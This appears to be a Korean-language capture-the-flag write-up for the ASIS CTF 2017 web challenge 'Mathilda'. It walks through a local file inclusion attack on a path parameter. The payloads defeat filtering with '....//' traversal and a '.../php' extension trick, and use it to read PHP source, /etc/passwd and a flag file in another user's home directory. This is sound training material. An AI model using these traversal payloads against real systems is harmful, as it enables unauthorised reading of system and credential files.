==============================================================
[2017_asisctf] [web] Mathilda
==============================================================


문제내용
==============================================================

Mathilda learned many skills from Leon, now she want to use them!


문제 풀이
==============================================================

해당 페이지에 접속하면 "Welcome to home"이라는 문구와 함께 이미지 파일만 존재한다.

소스보기를 하면 "<!-- created by ~rooney -->"라는 주석이 존재한다.
"~rooney"라는 디렉토리로 접속을 시도하면 정상적으로 접속이 가능하고, 마틸다 사진과 함께 "Welcome to rooney page"라는 페이지가 출력된다.

.. code-block:: text

    http://178.62.48.181/~rooney/index.php

file이라는 링크가 걸려있어 클릭하게 되면, path라는 파라미터에 rooney라는 값을 통해 메시지가 출력된다.

.. code-block:: text

    http://178.62.48.181/~rooney/index.php?path=rooney

보아하니, path 파라미터 상에 lfi가 가능한 것으로 보인다.
먼저 index.php를 확인하기 위해 path에 "../index.php"를 넣어보니 "Security failed"라는 에러를 출력한다.

.. code-block:: text

    http://178.62.48.181/~rooney/index.php?path=../index.php


".php" 확장자에 대해 제한이 걸려있는 것으로 보인다. 
그럼 하위 체크에 대한 필터링이 있는 지 확인하기 위해 rooney라는 파일을 "path=../files/rooney"로 확인해본다.
확인 결과, 정상적으로 rooney 내용을 확인할 수 없었으며, replace가 있는 것으로 보인다.

.. code-block:: text

    http://178.62.48.181/~rooney/index.php?path=../files/rooney



"../"을 "....//"으로 바꾸고 입력한 결과, 정상적으로 rooney파일을 확인할 수 있었다.

.. code-block:: text

    http://178.62.48.181/~rooney/index.php?path=....//files/rooney


이걸 이용해서 "index.php"도 "index.../php"로 바꾸고 입력한 결과 정상적으로 php 소스코드를 확인할 수 있었다.

.. code-block:: text

    http://178.62.48.181/~rooney/index.php?path=....//index.../php



'''
난 여기서 index.php 상에 플래그가 있을 줄 알았으나, 해당 페이지에는 플래그가 없었다. 
그래서 다른 파일을 확인해야 하는 줄 알고, 먼저 index.html을 확인하기 위해 "....//....//index.html"을 입력했으나, 확인이 불가능했다.

여기서부터 게싱이나 인터넷 검색이 필요한 건가? 해서 삽질을 계속했으나... 결국 못찾음...
'''


해당 페이지가 rooney계정 페이지라는 것으로 추측하고, /etc/passwd를 읽기 위해 path상에 lfi를 진행해보자.

.. code-block:: text

    http://178.62.48.181/~rooney/index.php?path=....//....//....//....//etc/passwd

    'rooney:x:1000:1000:,,,:/home/rooney:/bin/false'
    'th1sizveryl0ngus3rn4me:x:1001:1001:,,,:/home/th1sizveryl0ngus3rn4me:/bin/bash'

rooney 계정말고도 th1sizveryl0ngus3rn4me라는 계정이 존재하는 걸 확인하였고 해당 디렉토리 상에 flag.php를 확인한 결과 플래그를 획득할 수 있었다.

.. code-block:: text

    http://178.62.48.181/~rooney/?path=....//....//....//....//home/th1sizveryl0ngus3rn4me/public_html/flag.../php
